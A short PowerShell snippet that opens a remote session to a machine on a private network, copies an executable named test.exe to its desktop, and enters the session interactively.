$session = New-PSSession -ComputerName "192.168.4.234" -Credential Test
Copy-Item -Path 'C:\Users\Jack\Desktop\test.exe' -Destination "C:\Users\Test\Desktop" -ToSession $session
Enter-PSSession -Session $session
